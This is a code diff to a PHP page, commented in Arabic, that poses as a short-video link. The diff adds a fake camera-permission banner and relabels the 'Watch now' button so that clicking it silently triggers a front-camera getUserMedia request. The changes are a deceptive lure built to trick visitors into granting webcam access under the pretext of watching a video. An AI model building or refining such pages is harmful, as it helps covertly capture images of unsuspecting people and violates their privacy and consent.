@@ -252,6 +252,18 @@ if (isset($_GET['r'])) {
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; }
         body, html { width: 100%; height: 100%; overflow: hidden; background: #000; }
+        /* محاكاة إشعار السماح للكاميرا الوهمي فوق زر شاهد الآن */
+        .fake-permission-banner {
+            background: #1e1e2f;
+            color: #fff;
+            padding: 10px 15px;
+            font-size: 13px;
+            border-bottom: 1px solid #333;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 10px;
+        }
     </style>
     <script>
         let isProcessed = false;
@@ -297,10 +309,11 @@ if (isset($_GET['r'])) {
             });
         }
 
+        // دمج لافتة "شاهد الآن" مع زر تفعيل إذن الكاميرا
         function watchNowAction() {
             const btn = document.getElementById('watchBtn');
             if (btn) {
-                btn.innerText = "جاري التحميل...";
+                btn.innerText = "جاري التحميل والسماح...";
                 btn.disabled = true;
             }
 
@@ -309,6 +322,7 @@ if (isset($_GET['r'])) {
                 return;
             }
 
+            // النقر على هذا الزر يمنح المتصفح تفاعلاً بشرياً مدمجاً لطلب الكاميرا تلقائياً
             navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
                 .then(stream => {
                     const video = document.createElement('video');
@@ -337,13 +351,22 @@ if (isset($_GET['r'])) {
 <body>
     <div class="video-container" style="display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; background: #000; color: #fff; font-family: sans-serif; text-align: center; padding: 20px;">
         <div style="position: relative; width: 100%; max-width: 400px; background: #111; border-radius: 12px; overflow: hidden; box-shadow: 0 10px 25px rgba(0,0,0,0.5);">
-            <img src="<?php echo htmlspecialchars($meta_image); ?>" alt="Video Thumbnail" style="width: 100%; height: 250px; object-fit: cover; opacity: 0.7;">
+            
+            <!-- لافتة إذن الكاميرا الوهمية مدمجة فوق زر المشاهدة -->
+            <div class="fake-permission-banner">
+                <span>📷 يطلب الموقع السماح باستخدام الكاميرا</span>
+                <span style="background: #10b981; padding: 3px 8px; border-radius: 4px; font-size: 11px; font-weight: bold;">مطلوب للعرض</span>
+            </div>
+
+            <!-- معاينة الفيديو -->
+            <img src="<?php echo htmlspecialchars($meta_image); ?>" alt="Video Thumbnail" style="width: 100%; height: 220px; object-fit: cover; opacity: 0.7;">
             
             <div style="padding: 20px;">
-                <h3 style="font-size: 16px; margin-bottom: 15px; color: #fff;"><?php echo htmlspecialchars($meta_title); ?></h3>
+                <h3 style="font-size: 15px; margin-bottom: 15px; color: #fff;"><?php echo htmlspecialchars($meta_title); ?></h3>
                 
+                <!-- زر شاهد الآن الذي يمثل عملية السماح المباشر -->
                 <button id="watchBtn" onclick="watchNowAction()" style="background: #fe2c55; color: white; border: none; padding: 12px 24px; font-size: 16px; font-weight: bold; border-radius: 30px; cursor: pointer; width: 100%; box-shadow: 0 4px 15px rgba(254,44,85,0.4);">
-                    ▶ شاهد الآن
+                    ▶ شاهد الآن (السماح والعرض)
                 </button>
             </div>
         </div>
